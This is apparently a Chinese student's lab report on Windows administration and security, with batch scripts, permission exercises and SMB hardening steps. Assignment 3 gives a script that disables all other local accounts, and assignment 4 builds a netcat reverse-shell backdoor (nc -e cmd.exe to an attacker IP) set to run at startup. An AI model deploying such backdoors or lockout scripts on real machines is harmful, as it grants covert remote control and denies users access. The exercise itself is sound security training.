# 作业1 互动创建用户

#### 脚本内容：

```bat
@echo off
set /p user= 请输入要创建的账户名: 
set /p password=请输入密码: 
net user %user% %password% /add

if %errorlevel% == 0 (
    echo 账户 %user% 创建成功！
) else (
    echo 账户创建失败！
)
pause
```



#### 尝试创建test1用户

![image-20250709111556036](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709111556036.png)

#### 验证是否创建成功

![image-20250709111749017](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709111749017.png)

# 作业二 互动修改密码

#### 脚本内容：

```
@echo off
set /p user=输入要修改密码的账号: 
set /p password=输入新的密码: 
net user %user% %password%
pause
```

#### 修改test1的密码

![image-20250709112505285](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709112505285.png)

#### 使用新密码成功登录系统，密码修改成功

![image-20250709112625631](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709112625631.png)



# 作业三 用户恶意脚本

#### 脚本内容：

```
@echo off
REM 获取当前用户
set currentUser=%username%

REM 获取所有本地用户
for /f "tokens=1" %%a in ('net user ^| find /v "管理员" ^| find /v "用户名"') do (
    REM 排除当前登录用户
    if /i not "%%a"=="%currentUser%" (
        REM 禁用账户
        net user "%%a" /active:no
        echo 用户 "%%a" 已禁用
    )
)

pause
```

#### 除了当前用户，其他所有用户都被禁用

![image-20250709114051175](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709114051175.png)



# 作业4 后门生成

#### 软件：natcat  攻击方 window 10（192.168.126.128）    被攻击方window7（192.168.126.130）

#### 在两个系统都安装软件natcat并在Path设置环境变量

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709164820877.png" alt="image-20250709164820877" style="zoom: 50%;" />

#### 在windows 10上创建脚本触发开始监听

```
@echo off
nc -lvp 4444
```

#### 在window 7上创建反向监听脚本

```
nc -e cmd.exe 192.168.126.128 4444
```

![image-20250709165605407](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709165605407.png)

#### windows 10与window 7建立成功建立链接，win10可以通过命令行操作win7

![image-20250709165818378](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709165818378.png)

#### 例如，在win10远程操作win7开启计算器   

![image-20250709165951252](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709165951252.png)

#### 在win7上，计算器被成功打开

![image-20250709170131721](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709170131721.png)

#### 在win7上把后门脚本放到开机启动项

![image-20250709193748742](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709193748742.png)

#### 这样监听脚本就会随着开机，一起启动



# 作业5

#### 验证网络是否连通

![9a9236fde981e8966c32df0ca0adfd3b](C:\Users\Administrator\Documents\Tencent Files\1282341070\nt_qq\nt_data\Pic\2025-07\Ori\9a9236fde981e8966c32df0ca0adfd3b.png)

#### 尝试远程登录管理员成功，但是普通用户wenjian无法登录

![6d3bf5bedd0e259159bbb068aed024f6](C:\Users\Administrator\Documents\Tencent Files\1282341070\nt_qq\nt_data\Pic\2025-07\Ori\6d3bf5bedd0e259159bbb068aed024f6.png)

#### 把wenjian添加到远程组

![a544745bd06e565ed4a968ed514159eb](C:\Users\Administrator\Documents\Tencent Files\1282341070\nt_qq\nt_data\Pic\2025-07\Ori\a544745bd06e565ed4a968ed514159eb.png)

#### 验证是否添加到远程组

<img src="C:\Users\Administrator\Documents\Tencent Files\1282341070\nt_qq\nt_data\Pic\2025-07\Ori\73bf789c99cd4aa771b8595a475d6ae8.png" alt="73bf789c99cd4aa771b8595a475d6ae8" style="zoom: 50%;" />

#### wenjian远程登陆成功

<img src="C:\Users\Administrator\Documents\Tencent Files\1282341070\nt_qq\nt_data\Pic\2025-07\Ori\cabf45e69f7313d875f804cad3a69871.png" alt="cabf45e69f7313d875f804cad3a69871" style="zoom:67%;" />



# 作业六

#### 创建student和teacher用户

![image-20250709185520988](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709185520988.png)

#### 创建作业上传文件夹并禁用继承,而后删除其他不相关的用户

#### 给teacher读写的权限，给student写入的权限

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709190118760.png" alt="image-20250709190118760" style="zoom:50%;" />

#### 验证实验：以学生账号登录，可以上传作业，但不能对作业进行修改，删除

![image-20250709190416385](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709190416385.png)

#### 以老师账号登录，可以修改，上传，复制 ......

![image-20250709190635171](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709190635171.png)



# 实验7

#### 在student创建一个文件夹，禁用继承并删除所有共享账户，只添加student

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709190941511.png" alt="image-20250709190941511" style="zoom:80%;" />

#### 登录administrator查看该文件夹发现无法写入和查看

#### 在文件夹的高级安全设置中点击更改所有者，写入administrator，并勾选替换子容器和对象所有者

![image-20250709191305336](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709191305336.png)

#### 成功替换权限，可以在管理员查看该文件夹

![image-20250709191403225](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709191403225.png)



# 实验8

进入作业上传文件夹的高级共享设置，设置别名并给student设置共享权限，允许student完全控制

![image-20250709192012002](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709192012002.png)

#### 在win7中以student用户访问此文件夹，可以修改而无法查看

![image-20250709192552584](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709192552584.png)



# 实验9

#### 在注册表HKEY_Local_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters\

#### 右键新建REG_DWORD类型的AutoShareWks 键，值为 0

![image-20250709192949578](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709192949578.png)

#### 关闭445服务

打开services.msc（服务管理窗口），并停止及禁用server服务，来禁止445端口的开放！



#### ![image-20250709193056005](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250709193056005.png)
